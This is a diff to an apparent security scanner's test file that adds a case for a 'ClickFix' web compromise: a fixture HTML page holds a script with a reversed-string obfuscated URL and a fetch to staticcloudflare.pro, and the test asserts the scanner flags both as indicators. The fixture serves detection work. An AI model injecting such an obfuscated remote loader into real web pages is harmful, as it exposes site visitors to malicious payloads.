@@ -155,6 +155,25 @@ try {
   fs.rmSync(tmpLaravelLangPayloadRoot, { recursive: true, force: true });
 }
 
+const tmpStaticCloudflareClickFixRoot = fs.mkdtempSync(path.join(__dirname, "tmp-staticcloudflare-clickfix-"));
+try {
+  fs.writeFileSync(
+    path.join(tmpStaticCloudflareClickFixRoot, "compromised-page.html"),
+    [
+      "<script>",
+      "const remote = 'sj.ssc/ipa/orp.eralfduolccitats'.split('').reverse().join('');",
+      "fetch('https://staticcloudflare.pro/api/css.js');",
+      "</script>"
+    ].join("\n")
+  );
+  const clickFixLoader = scanTarget(tmpStaticCloudflareClickFixRoot);
+  assert.strictEqual(clickFixLoader.risk, "possible-exposure");
+  assert(clickFixLoader.findings.some((finding) => finding.type === "network-indicator" && finding.message.includes("staticcloudflare.pro")));
+  assert(clickFixLoader.findings.some((finding) => finding.type === "campaign-indicator" && finding.message.includes("sj.ssc/ipa/orp.eralfduolccitats")));
+} finally {
+  fs.rmSync(tmpStaticCloudflareClickFixRoot, { recursive: true, force: true });
+}
+
 const tmpDevdojoComposerRoot = fs.mkdtempSync(path.join(__dirname, "tmp-devdojo-composer-"));
 try {
   fs.writeFileSync(
